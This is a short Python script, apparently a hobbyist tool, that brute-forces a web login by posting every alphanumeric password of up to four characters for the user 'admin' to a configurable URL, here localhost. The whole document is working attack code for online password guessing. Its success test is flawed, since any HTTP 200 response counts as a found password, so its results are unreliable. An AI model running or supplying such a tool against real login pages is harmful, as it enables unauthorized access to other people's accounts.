import itertools
import string
import requests

def brute_force_login(url, username, max_length=4):
    characters = string.ascii_letters + string.digits
    for length in range(1, max_length + 1):
        for attempt in itertools.product(characters, repeat=length):
            password = ''.join(attempt)
            response = requests.post(url, data={'username': username, 'password': password})
            
            
            if "Welcome" in response.text or response.status_code == 200:
                print(f"Password found: {password}")
                return
            else:
                print(f"Trying password: {password}")

    print("Password not found")

# URL comes here added
test_url = "http://localhost/login"
brute_force_login(test_url, "admin")

#make sure u have already requests modul installed on your host.
#if not this is for bash "pip install requests"
